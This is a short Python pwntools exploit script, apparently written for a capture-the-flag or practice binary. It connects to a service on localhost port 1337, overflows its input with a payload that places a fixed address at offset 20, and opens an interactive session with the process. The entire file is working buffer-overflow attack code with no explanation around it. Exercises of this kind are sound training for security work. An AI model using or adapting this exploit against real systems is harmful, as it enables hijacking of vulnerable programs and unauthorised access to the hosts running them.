from pwn import *

p = remote("127.0.0.1", 1337)
offset = 20

payload = flat({
	offset : [
		5134160
	]
})


p.sendline(payload)

p.interactive()